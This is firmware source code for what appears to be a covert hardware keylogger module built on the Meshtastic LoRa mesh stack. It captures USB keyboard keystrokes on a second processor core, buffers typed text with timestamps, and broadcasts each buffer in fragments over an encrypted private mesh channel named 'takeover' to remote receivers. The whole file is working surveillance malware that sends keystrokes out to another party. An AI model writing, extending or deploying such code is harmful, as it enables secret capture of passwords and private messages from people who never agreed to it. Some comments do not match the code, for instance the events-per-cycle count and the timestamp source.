/**
 * @file USBCaptureModule.cpp
 * @brief USB keyboard capture module implementation with LoRa mesh transmission
 *
 * SPDX-License-Identifier: GPL-3.0-only
 *
 * ============================================================================
 * MESH TRANSMISSION - Private Channel "takeover"
 * ============================================================================
 *
 * When the keystroke buffer is finalized (full or flushed), it is automatically
 * transmitted over the LoRa mesh network via the private "takeover" channel.
 *
 * Channel Configuration (defined in platformio.ini):
 *   - Channel Index: 1 (secondary channel)
 *   - Channel Name: "takeover"
 *   - Encryption: AES256 with 32-byte PSK
 *   - Port: TEXT_MESSAGE_APP (displays as text on receiving devices)
 *
 * Transmission Details:
 *   - Auto-fragments if data exceeds MAX_PAYLOAD (~237 bytes)
 *   - Broadcasts to all nodes (NODENUM_BROADCAST)
 *   - No acknowledgment requested (want_ack = false)
 *   - Receiving nodes must have matching channel 1 PSK to decrypt
 *
 * Function: broadcastToPrivateChannel(data, len)
 *   - Validates inputs and mesh service availability
 *   - Fragments data into LoRa-sized packets
 *   - Sends each fragment via service->sendToMesh()
 *
 * ============================================================================
 * KEYSTROKE BUFFER FORMAT (500 bytes) - Delta Encoding
 * ============================================================================
 *
 * Layout:
 * ┌─────────────┬────────────────────────────────────────┬─────────────┐
 * │ Bytes 0-9   │           Bytes 10-489                 │ Bytes 490-499│
 * │ Start Epoch │     Keystroke Data (480 bytes)         │ Final Epoch │
 * └─────────────┴────────────────────────────────────────┴─────────────┘
 *
 * Epoch Format (Start/End):
 *   - 10 ASCII digits representing unix timestamp (e.g., "1733250000")
 *   - Start epoch: Written when buffer is initialized (first keystroke)
 *   - Final epoch: Written when buffer is finalized (full or flushed)
 *
 * Data Area Format:
 *   - Regular characters: 1 byte each (stored as-is)
 *   - Tab key: '\t' (1 byte)
 *   - Backspace: '\b' (1 byte)
 *   - Enter key: 0xFF marker + 2-byte delta = 3 bytes total
 *
 * Delta Encoding:
 *   - Enter key stores seconds elapsed since buffer start epoch
 *   - 2-byte big-endian format (0-65535 seconds = ~18 hours max)
 *   - Prefixed with 0xFF marker byte for identification
 *   - Buffer auto-finalizes if delta exceeds 65000 seconds
 *
 * Example Buffer Content:
 *   [1733250000][hello world][0xFF 0x00 0x05][second line][0xFF 0x00 0x0A][more][1733250099]
 *    └─start──┘              └─delta +5s──┘              └─delta +10s──┘       └─final───┘
 *
 * To Decode Enter Timestamp:
 *   enter_epoch = start_epoch + delta
 *   Example: 1733250000 + 5 = 1733250005
 *
 * Space Savings:
 *   - Old: 10 bytes per Enter (full epoch)
 *   - New: 3 bytes per Enter (marker + delta)
 *   - Savings: 7 bytes per Enter key (70% reduction)
 *
 * ============================================================================
 */

#include "USBCaptureModule.h"

#ifdef XIAO_USB_CAPTURE_ENABLED

#include "../platform/rp2xx0/usb_capture/usb_capture_main.h"
#include "configuration.h"
#include "pico/multicore.h"
#include <Arduino.h>
#include <cstring>

/* Mesh includes for private channel transmission */
#include "MeshService.h"
#include "Router.h"
#include "mesh-pb-constants.h"

/* Channel index for "takeover" private channel (configured in platformio.ini) */
#define TAKEOVER_CHANNEL_INDEX 1

USBCaptureModule *usbCaptureModule;

/* Global keystroke queue for inter-core communication */
static keystroke_queue_t g_keystroke_queue;

USBCaptureModule::USBCaptureModule() : concurrency::OSThread("USBCapture")
{
    keystroke_queue = &g_keystroke_queue;
    core1_started = false;
    buffer_write_pos = KEYSTROKE_DATA_START;
    buffer_initialized = false;
    buffer_start_epoch = 0;
    memset(keystroke_buffer, 0, KEYSTROKE_BUFFER_SIZE);
}

bool USBCaptureModule::init()
{
    LOG_INFO("[Core%u] USB Capture Module initializing...", get_core_num());

    /* Initialize keystroke queue */
    keystroke_queue_init(keystroke_queue);

    /* Initialize capture controller */
    capture_controller_init_v2(&controller, keystroke_queue);

    /* Set capture speed - default to LOW speed (1.5 Mbps) */
    /* Change to CAPTURE_SPEED_FULL for full speed USB (12 Mbps) */
    capture_controller_set_speed_v2(&controller, CAPTURE_SPEED_LOW);

    /* Core1 will be launched on first runOnce() call */
    LOG_INFO("USB Capture Module initialized (Core1 will start in main loop)");

    return true;
}

int32_t USBCaptureModule::runOnce()
{
    /* Launch Core1 on first run (completely non-blocking) */
    if (!core1_started)
    {
        LOG_INFO("Launching Core1 for USB capture (independent operation)...");
        LOG_DEBUG("Core1 launch: queue=%p, controller initialized", (void*)keystroke_queue);

        /* Check if Core1 is already running (safety check) */
        if (multicore_fifo_rvalid())
        {
            LOG_WARN("FIFO has data before Core1 launch - draining...");
            multicore_fifo_drain();
        }

        LOG_DEBUG("About to call multicore_launch_core1()...");

        /* Try to reset Core1 first in case it's in a bad state */
        multicore_reset_core1();
        LOG_DEBUG("Core1 reset complete");

        /* Use busy-wait instead of delay() to avoid scheduler issues */
        uint32_t start = millis();
        while (millis() - start < 100)
        {
            tight_loop_contents();
        }

        LOG_DEBUG("Launching Core1 now...");

        /* Core1 will auto-start capture when launched - no commands needed */
        multicore_launch_core1(capture_controller_core1_main_v2);

        LOG_DEBUG("multicore_launch_core1() returned successfully");
        core1_started = true;

        LOG_INFO("Core1 launched and running independently");
    }

    /* Process any pending keystrokes from the queue (non-blocking) */
    processKeystrokeQueue();

    /* Check queue every 100ms */
    return 100;
}

void USBCaptureModule::processKeystrokeQueue()
{
    keystroke_event_t event;

    /* Process up to 5 events per cycle to avoid blocking */
    char log_buffer[128];
    for (int i = 0; i < 10; i++)
    {
        if (!keystroke_queue_pop(keystroke_queue, &event))
        {
            /* Queue is empty */
            break;
        }

        /* Format and log the keystroke */
        formatKeystrokeEvent(&event, log_buffer, sizeof(log_buffer));
        LOG_INFO("[Core%u] Keystroke: %s", get_core_num(), log_buffer);

        /* Add to keystroke buffer based on event type */
        bool added = false;
        switch (event.type)
        {
        case KEYSTROKE_TYPE_CHAR:
            added = addToBuffer(event.character);
            break;

        case KEYSTROKE_TYPE_ENTER:
            added = addEnterToBuffer();
            break;

        case KEYSTROKE_TYPE_TAB:
            added = addToBuffer('\t');
            break;

        case KEYSTROKE_TYPE_BACKSPACE:
            /* Optionally handle backspace - could remove last char or add marker */
            added = addToBuffer('\b');
            break;

        default:
            /* Ignore errors, resets, and unknown types */
            added = true;
            break;
        }

        /* If buffer is full, finalize and start fresh */
        if (!added)
        {
            LOG_INFO("Keystroke buffer full, finalizing...");
            finalizeBuffer();

            /* Retry adding to new buffer */
            if (event.type == KEYSTROKE_TYPE_ENTER)
                addEnterToBuffer();
            else if (event.type == KEYSTROKE_TYPE_CHAR)
                addToBuffer(event.character);
            else if (event.type == KEYSTROKE_TYPE_TAB)
                addToBuffer('\t');
            else if (event.type == KEYSTROKE_TYPE_BACKSPACE)
                addToBuffer('\b');
        }
    }

    /* Log queue statistics periodically */
    static uint32_t last_stats_time = 0;
    uint32_t now = millis();
    if (now - last_stats_time > 10000) /* Every 10 seconds */
    {
        uint32_t count = keystroke_queue_count(keystroke_queue);
        uint32_t dropped = keystroke_queue_get_dropped_count(keystroke_queue);
        LOG_DEBUG("[Core%u] Queue stats: count=%u, dropped=%u", get_core_num(), count, dropped);
        last_stats_time = now;
    }
}

void USBCaptureModule::formatKeystrokeEvent(const keystroke_event_t *event, char *buffer, size_t buffer_size)
{
    switch (event->type)
    {
    case KEYSTROKE_TYPE_CHAR:
        snprintf(buffer, buffer_size, "CHAR '%c' (scancode=0x%02x, mod=0x%02x)", event->character, event->scancode,
                 event->modifier);
        break;

    case KEYSTROKE_TYPE_BACKSPACE:
        snprintf(buffer, buffer_size, "BACKSPACE");
        break;

    case KEYSTROKE_TYPE_ENTER:
        snprintf(buffer, buffer_size, "ENTER");
        break;

    case KEYSTROKE_TYPE_TAB:
        snprintf(buffer, buffer_size, "TAB");
        break;

    case KEYSTROKE_TYPE_ERROR:
        if (event->error_flags == 0xDEADC1C1)
        {
            snprintf(buffer, buffer_size, "CORE1_ERROR: PIO configuration failed!");
        }
        else
        {
            snprintf(buffer, buffer_size, "ERROR (flags=0x%08x)", event->error_flags);
        }
        break;

    case KEYSTROKE_TYPE_RESET:
        /* Decode Core1 status codes */
        if (event->scancode == 0xC1)
        {
            snprintf(buffer, buffer_size, "CORE1_STATUS: Core1 entry point reached");
        }
        else if (event->scancode == 0xC2)
        {
            snprintf(buffer, buffer_size, "CORE1_STATUS: Starting PIO configuration...");
        }
        else if (event->scancode == 0xC3)
        {
            snprintf(buffer, buffer_size, "CORE1_STATUS: PIO configured successfully");
        }
        else if (event->scancode == 0xC4)
        {
            snprintf(buffer, buffer_size, "CORE1_STATUS: Ready to capture USB data");
        }
        else
        {
            snprintf(buffer, buffer_size, "RESET (scancode=0x%02x)", event->scancode);
        }
        break;

    default:
        snprintf(buffer, buffer_size, "UNKNOWN (type=%d)", event->type);
        break;
    }
}

void USBCaptureModule::writeEpochAt(size_t pos)
{
    /* Get current unix epoch as 10-digit ASCII string */
    uint32_t epoch = (uint32_t)(millis() / 1000);  /* TODO: Replace with RTC if available */
    snprintf(&keystroke_buffer[pos], EPOCH_SIZE + 1, "%010u", epoch);
}

void USBCaptureModule::writeDeltaAt(size_t pos, uint16_t delta)
{
    /* Write 2-byte delta in big-endian format */
    keystroke_buffer[pos] = (char)((delta >> 8) & 0xFF);
    keystroke_buffer[pos + 1] = (char)(delta & 0xFF);
}

void USBCaptureModule::initKeystrokeBuffer()
{
    memset(keystroke_buffer, 0, KEYSTROKE_BUFFER_SIZE);
    buffer_write_pos = KEYSTROKE_DATA_START;

    /* Store start epoch for delta calculations */
    buffer_start_epoch = (uint32_t)(millis() / 1000);

    /* Write start epoch at position 0 */
    writeEpochAt(0);
    buffer_initialized = true;

    LOG_DEBUG("Keystroke buffer initialized, start epoch=%u", buffer_start_epoch);
}

size_t USBCaptureModule::getBufferSpace() const
{
    if (buffer_write_pos >= KEYSTROKE_DATA_END)
        return 0;
    return KEYSTROKE_DATA_END - buffer_write_pos;
}

bool USBCaptureModule::addToBuffer(char c)
{
    if (!buffer_initialized)
    {
        initKeystrokeBuffer();
    }

    /* Need at least 1 byte for char */
    if (getBufferSpace() < 1)
    {
        return false;
    }

    keystroke_buffer[buffer_write_pos++] = c;
    return true;
}

bool USBCaptureModule::addEnterToBuffer()
{
    if (!buffer_initialized)
    {
        initKeystrokeBuffer();
    }

    /* Calculate delta from buffer start */
    uint32_t current_epoch = (uint32_t)(millis() / 1000);
    uint32_t delta = current_epoch - buffer_start_epoch;

    /* If delta exceeds safe limit, force finalization and start fresh */
    if (delta > DELTA_MAX_SAFE)
    {
        LOG_INFO("Delta overflow (%u > %u), forcing buffer finalization", delta, DELTA_MAX_SAFE);
        finalizeBuffer();
        initKeystrokeBuffer();
        /* Recalculate delta with new buffer start */
        delta = 0;
    }

    /* Need 3 bytes: marker + 2-byte delta */
    if (getBufferSpace() < DELTA_TOTAL_SIZE)
    {
        return false;
    }

    /* Write marker byte followed by delta */
    keystroke_buffer[buffer_write_pos++] = DELTA_MARKER;
    writeDeltaAt(buffer_write_pos, (uint16_t)delta);
    buffer_write_pos += DELTA_SIZE;

    return true;
}

void USBCaptureModule::finalizeBuffer()
{
    if (!buffer_initialized)
        return;

    /* Write final epoch at position 490 */
    writeEpochAt(KEYSTROKE_DATA_END);

    LOG_INFO("Buffer finalized. Content: %zu bytes", buffer_write_pos - KEYSTROKE_DATA_START);

    /* Log buffer content in viewable form */
    LOG_INFO("=== BUFFER START ===");
    LOG_INFO("Start Epoch: %.10s", keystroke_buffer);

    /* Log data section - delta markers indicate new lines */
    char line_buffer[128];
    size_t line_pos = 0;
    size_t data_len = buffer_write_pos - KEYSTROKE_DATA_START;

    for (size_t i = 0; i < data_len; i++)
    {
        unsigned char c = (unsigned char)keystroke_buffer[KEYSTROKE_DATA_START + i];

        /* Check if this is a delta marker (0xFF followed by 2 bytes) */
        if (c == DELTA_MARKER && (i + DELTA_TOTAL_SIZE - 1) <= data_len)
        {
            /* Output current line if we have content */
            if (line_pos > 0)
            {
                line_buffer[line_pos] = '\0';
                LOG_INFO("Line: %s", line_buffer);
                line_pos = 0;
            }

            /* Read 2-byte delta (big-endian) */
            uint16_t delta = ((unsigned char)keystroke_buffer[KEYSTROKE_DATA_START + i + 1] << 8) |
                             (unsigned char)keystroke_buffer[KEYSTROKE_DATA_START + i + 2];

            /* Calculate full epoch from start + delta */
            uint32_t enter_epoch = buffer_start_epoch + delta;

            LOG_INFO("Enter [epoch=%u, delta=+%u]", enter_epoch, delta);
            i += DELTA_TOTAL_SIZE - 1; /* Skip marker + delta bytes (-1 because loop increments) */
            continue;
        }

        /* Add character to current line */
        if (c == '\t')
        {
            if (line_pos < sizeof(line_buffer) - 3)
            {
                line_buffer[line_pos++] = '\\';
                line_buffer[line_pos++] = 't';
            }
        }
        else if (c == '\b')
        {
            if (line_pos < sizeof(line_buffer) - 3)
            {
                line_buffer[line_pos++] = '\\';
                line_buffer[line_pos++] = 'b';
            }
        }
        else if (c >= 32 && c < 127)
        {
            if (line_pos < sizeof(line_buffer) - 1)
            {
                line_buffer[line_pos++] = c;
            }
        }
    }

    /* Output any remaining content */
    if (line_pos > 0)
    {
        line_buffer[line_pos] = '\0';
        LOG_INFO("Line: %s", line_buffer);
    }

    LOG_INFO("Final Epoch: %.10s", &keystroke_buffer[KEYSTROKE_DATA_END]);
    LOG_INFO("=== BUFFER END ===");

    /* Transmit buffer over private channel */
    broadcastToPrivateChannel((const uint8_t *)keystroke_buffer, KEYSTROKE_BUFFER_SIZE);

    /* Reset for next buffer */
    buffer_initialized = false;
    buffer_write_pos = KEYSTROKE_DATA_START;
}

bool USBCaptureModule::broadcastToPrivateChannel(const uint8_t *data, size_t len)
{
    /* Validate inputs */
    if (!data || len == 0) {
        LOG_WARN("broadcastToPrivateChannel: invalid data or length");
        return false;
    }

    /* Check if mesh service is available */
    if (!service || !router) {
        LOG_WARN("broadcastToPrivateChannel: mesh service not available");
        return false;
    }

    /* Max payload size for LoRa packet (see mesh-pb-constants.h) */
    const size_t MAX_PAYLOAD = meshtastic_Constants_DATA_PAYLOAD_LEN;

    /* Fragment data if necessary */
    size_t offset = 0;
    uint8_t fragment_num = 0;

    while (offset < len) {
        size_t chunk_size = (len - offset > MAX_PAYLOAD) ? MAX_PAYLOAD : (len - offset);

        /* Allocate packet from router pool */
        meshtastic_MeshPacket *p = router->allocForSending();
        if (!p) {
            LOG_ERROR("broadcastToPrivateChannel: failed to allocate packet");
            return false;
        }

        /* Configure packet for private channel broadcast */
        p->to = NODENUM_BROADCAST;
        p->channel = TAKEOVER_CHANNEL_INDEX;
        p->want_ack = false;
        p->priority = meshtastic_MeshPacket_Priority_DEFAULT;

        /* Set portnum to TEXT_MESSAGE_APP for display on receiving devices */
        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;

        /* Copy payload data */
        p->decoded.payload.size = chunk_size;
        memcpy(p->decoded.payload.bytes, data + offset, chunk_size);

        /* Send to mesh */
        service->sendToMesh(p, RX_SRC_LOCAL, false);

        LOG_INFO("Sent fragment %u: %zu bytes to channel %d", fragment_num, chunk_size, TAKEOVER_CHANNEL_INDEX);

        offset += chunk_size;
        fragment_num++;
    }

    LOG_INFO("broadcastToPrivateChannel: sent %zu bytes in %u fragment(s)", len, fragment_num);
    return true;
}

#endif /* XIAO_USB_CAPTURE_ENABLED */
